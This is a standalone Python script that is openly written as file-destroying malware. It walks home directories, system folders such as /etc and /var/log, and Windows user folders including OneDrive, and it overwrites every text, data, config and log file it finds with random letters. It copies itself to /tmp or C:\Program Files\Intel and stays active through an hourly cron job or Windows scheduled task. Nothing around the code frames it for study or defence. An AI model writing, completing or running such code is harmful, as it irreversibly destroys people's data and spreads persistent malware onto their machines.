import os
import sys
import random
import string
import shutil
import subprocess
import platform

def generate_random_string(length):
    # Generate a random string of specified length using ASCII letters
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

def infect_files(directory):
    # Define valid file extensions to target
    valid_extensions = (".txt", ".csv", ".json", ".xml", ".html", ".md", ".log", ".yaml", ".yml", ".sql")
    for root, dirs, files in os.walk(directory):
        for file in files:
            # Check if file has a valid extension and is not the script itself
            if file.endswith(valid_extensions) and file != os.path.basename(__file__):
                file_path = os.path.join(root, file)
                # Overwrite the file with random content
                with open(file_path, "w") as f:
                    f.write(generate_random_string(100))

def clone_script(target_directory):
    # Copy the script to the target directory
    script_name = os.path.basename(__file__)
    target_path = os.path.join(target_directory, script_name)
    shutil.copy(__file__, target_path)

def schedule_cron_job():
    # Define the path of the cloned script in /tmp
    script_path = "/tmp/" + os.path.basename(__file__)
    
    # Generate a random minute (0-59) for the cron job
    random_minute = random.randint(0, 59)
    
    # Create a cron job command to run the script hourly
    cron_command = f"{random_minute} * * * * python3 {script_path}\n"
    
    # Add the cron job to the crontab
    subprocess.run(f'(crontab -l; echo "{cron_command}") | crontab -', shell=True, check=True)

def schedule_task_windows():
    # Define the target path where the script is copied on Windows
    target_path = "C:\\Program Files\\" + os.path.basename(__file__)
    
    # Generate a random minute (0-59) for the task
    random_minute = random.randint(0, 59)
    
    # Create a task name for the scheduled task
    task_name = "RandomMinuteTask"
    
    # Create a command to schedule the task to run hourly
    task_command = f"schtasks /create /tn {task_name} /tr \"python {target_path}\" /sc hourly /mo 1 /st {random_minute:02}:00 /f"
    
    # Add the task using the command
    subprocess.run(task_command, shell=True, check=True)

def main():
    # Get the current working directory
    current_directory = os.getcwd()
    # Infect files only in the current directory
    infect_files(current_directory)

    # Determine the operating system
    system = platform.system()

    if system == "Linux":
        # Define directories to infect on Linux
        directories_to_infect = [
            os.path.expanduser("~"),
            "/home/<username>/",
            "/home/<username>/Desktop",
            "/etc/",
            "/var/log/",
            "/var/lib/",
            "/opt/",
            "/usr/local/"
        ]
        # Copy script to /tmp directory
        clone_script("/tmp")
    elif system == "Windows":
        # Define directories to infect on Windows
        directories_to_infect = [
            os.path.join(os.environ['USERPROFILE'], 'Documents'),
            os.path.join(os.environ['USERPROFILE'], 'Desktop'),
            os.path.join(os.environ['USERPROFILE'], 'Downloads'),
            os.path.join(os.environ['USERPROFILE'], 'Pictures'),
            os.path.join(os.environ['USERPROFILE'], 'Music'),
            os.path.join(os.environ['USERPROFILE'], 'Videos'),
            os.path.join(os.environ['USERPROFILE'], 'OneDrive'),
            os.path.join(os.environ['USERPROFILE'], 'Favorites'),
            os.path.join(os.environ['USERPROFILE'], 'Links'),
            os.path.join(os.environ['USERPROFILE'], 'Saved Games')
        ]
        # Copy script to C:\Program Files\Intel directory
        clone_script("C:\\Program Files\\Intel")

    # Infect files in each specified directory
    for directory in directories_to_infect:
        infect_files(directory)

    # Schedule the cron job for Linux or task for Windows
    if system == "Linux":
        schedule_cron_job()
    elif system == "Windows":
        schedule_task_windows()

if __name__ == "__main__":
    main()